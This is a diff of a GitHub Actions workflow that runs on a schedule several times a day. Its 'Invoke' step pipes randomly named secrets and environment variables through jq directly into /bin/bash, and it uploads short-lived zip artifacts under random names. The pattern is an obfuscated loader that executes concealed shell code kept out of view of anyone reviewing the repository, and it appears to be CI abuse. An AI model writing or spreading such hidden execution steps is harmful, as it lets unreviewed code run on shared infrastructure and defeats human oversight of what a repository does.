@@ -3,7 +3,7 @@ on:
   workflow_dispatch:
 
   schedule:
-    - cron: '59 2,8,14,20 * * *'
+    - cron: '4 0,6,12,18 * * *'
 permissions:
   contents: read
 concurrency:
@@ -18,17 +18,21 @@ jobs:
           fetch-depth: 1
       - name: Invoke
         env:
-          wdmu3883: ${{ secrets.wdmu3883 }}
+          epfpf483: ${{ secrets.epfpf483 }}
         run: |
-          printf '%s' "$wdmu3883" | jq -r .gjg49 | /bin/bash
-          printf '%s' "$nkqu46003" | jq -r .jnb900 | /bin/bash
-          echo $kauzv388 | jq -r .aqr531 | /bin/bash
-          printf '%s' "$ri96" | jq -r .cts67 | /bin/bash
+          printf '%s' "$epfpf483" | jq -r .jwqnc1 | /bin/bash
+          echo $xg6740 | jq -r .hlz451 | /bin/bash
+          echo $rblrs831 | jq -r .wmyip251 | /bin/bash
+          printf '%s' "$shl4340" | jq -r .csdoa7489 | /bin/bash
+          printf '%s' "$qavj457" | jq -r .j7746 | /bin/bash
+          printf '%s' "$c68666" | jq -r .xw854 | /bin/bash
+          echo $xuwhw475 | jq -r .o291 | /bin/bash
+          printf '%s' "$sy17" | jq -r .kf3456 | /bin/bash
 
       - name: Store artifact
         if: always()
         uses: actions/upload-artifact@v4
         with:
-          name: Nx5m8WrF
+          name: xofNwKi7
           path: "*.zip"
           retention-days: 1
